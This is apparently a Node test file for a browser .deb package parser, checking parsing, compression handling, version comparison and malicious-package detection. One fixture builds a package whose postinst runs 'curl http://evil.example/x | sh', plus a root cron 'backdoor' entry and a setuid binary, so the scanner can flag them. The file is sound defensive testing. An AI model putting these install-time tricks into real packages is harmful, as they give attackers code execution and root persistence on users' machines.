/* Node test for the browser deb parser. Builds fixture .debs with dpkg-deb
 * and decompresses with system gzip/xz/zstd in place of the browser APIs.
 *
 * Run: node --test test/
 * Requires: dpkg-deb, gzip, xz, zstd (Debian/Ubuntu: apt install dpkg xz-utils zstd)
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, chmodSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { parseDeb, compareDebVersions, extractEmail } from "../site/debparse.js";

const sh = (cmd, args, input) => new Uint8Array(execFileSync(cmd, args, { input, maxBuffer: 1 << 28 }));
const decompressors = {
  gzip: async (d) => sh("gzip", ["-dc"], d),
  xz: async (d) => sh("xz", ["-dc"], d),
  zstd: async (d) => sh("zstd", ["-dc"], d),
};

function buildDeb({ name, version, maintainer, evil = false, compression = "xz" }) {
  const root = mkdtempSync(join(tmpdir(), "debfix-"));
  const stage = join(root, "stage");
  mkdirSync(join(stage, "DEBIAN"), { recursive: true });
  mkdirSync(join(stage, "usr/share/APPLaunch/applications"), { recursive: true });
  mkdirSync(join(stage, "usr/share/APPLaunch/bin"), { recursive: true });
  mkdirSync(join(stage, "usr/share/APPLaunch/share/images"), { recursive: true });

  writeFileSync(join(stage, "DEBIAN/control"),
    `Package: ${name}\nVersion: ${version}\nArchitecture: arm64\n` +
    `Maintainer: ${maintainer}\nDescription: test fixture\n`);
  writeFileSync(join(stage, `usr/share/APPLaunch/applications/${name}.desktop`),
    `[Desktop Entry]\nName=Fixture App\nExec=/usr/share/APPLaunch/bin/${name}\n` +
    `Terminal=false\nIcon=share/images/${name}.png\nType=Application\n`);
  // Tiny valid PNG (1x1)
  const png = Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
    "base64");
  writeFileSync(join(stage, `usr/share/APPLaunch/share/images/${name}.png`), png);
  writeFileSync(join(stage, `usr/share/APPLaunch/bin/${name}`), "#!/bin/sh\necho hi\n");
  chmodSync(join(stage, `usr/share/APPLaunch/bin/${name}`), 0o755);

  if (evil) {
    writeFileSync(join(stage, "DEBIAN/postinst"), "#!/bin/sh\ncurl http://evil.example/x | sh\n");
    chmodSync(join(stage, "DEBIAN/postinst"), 0o755);
    mkdirSync(join(stage, "etc/cron.d"), { recursive: true });
    writeFileSync(join(stage, "etc/cron.d/backdoor"), "* * * * * root /usr/share/APPLaunch/bin/x\n");
    chmodSync(join(stage, `usr/share/APPLaunch/bin/${name}`), 0o4755); // setuid
  }

  const out = join(root, `${name}_${version}_arm64.deb`);
  execFileSync("dpkg-deb", ["--root-owner-group", `-Z${compression}`, "-b", stage, out],
    { stdio: "pipe" });
  return out;
}

test("parses a clean package (xz)", async () => {
  const deb = buildDeb({
    name: "fixture", version: "1.2.3",
    maintainer: "Dev <dev@users.noreply.github.com>",
  });
  const r = await parseDeb(readFileSync(deb), decompressors);
  assert.equal(r.control.Package, "fixture");
  assert.equal(r.control.Version, "1.2.3");
  assert.equal(r.email, "dev@users.noreply.github.com");
  assert.equal(r.desktop.Name, "Fixture App");
  assert.ok(r.icon && r.icon.isPng);
  assert.equal(r.verdict, "pass");
});

test("parses gzip and zstd members too", async () => {
  for (const compression of ["gzip", "zstd"]) {
    const deb = buildDeb({
      name: "fixture", version: "1.0.0",
      maintainer: "Dev <dev@users.noreply.github.com>", compression,
    });
    const r = await parseDeb(readFileSync(deb), decompressors);
    assert.equal(r.control.Package, "fixture", compression);
  }
});

test("flags malicious content", async () => {
  const deb = buildDeb({
    name: "sketchy", version: "0.1",
    maintainer: "X <x@users.noreply.github.com>", evil: true,
  });
  const r = await parseDeb(readFileSync(deb), decompressors);
  const msgs = r.report.map(([, m]) => m).join("\n");
  assert.equal(r.verdict, "danger");
  assert.match(msgs, /下载并直接执行代码/);
  assert.match(msgs, /setuid/);
  assert.match(msgs, /非常规安装路径.*cron/);
});

test("dpkg version semantics", () => {
  assert.equal(compareDebVersions("1.0.4", "1.0.3"), 1);
  assert.equal(compareDebVersions("1.0.3", "1.0.3"), 0);
  assert.equal(compareDebVersions("1.0~beta", "1.0"), -1);
  assert.equal(compareDebVersions("1.0-m5stack2", "1.0-m5stack1"), 1);
  assert.equal(compareDebVersions("2:0.1", "1:9.9"), 1);
  assert.equal(extractEmail("A B <a@b.c>"), "a@b.c");
});
